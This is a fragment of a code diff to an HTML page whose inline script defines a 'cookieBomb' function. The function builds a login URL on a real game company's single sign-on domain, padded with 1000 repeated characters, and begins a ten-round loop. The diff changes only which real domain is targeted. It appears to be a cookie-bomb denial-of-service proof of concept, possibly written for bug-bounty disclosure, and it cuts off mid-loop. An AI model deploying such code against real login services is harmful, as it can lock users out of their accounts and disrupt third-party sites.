@@ -10,7 +10,7 @@
 <body>
   <script>
     async function cookieBomb() {
-      const target = 'https://xsso.riotgames.com/login?uri=https://riotgames.com/test?x=' + 'A'.repeat(1000)
+      const target = 'https://xsso.leagueoflegends.com/login?uri=https://leagueoflegends.com/test?x=' + 'A'.repeat(1000)
 
       for (let i = 0; i < 10; i++) {
         await new Promise(resolve => {
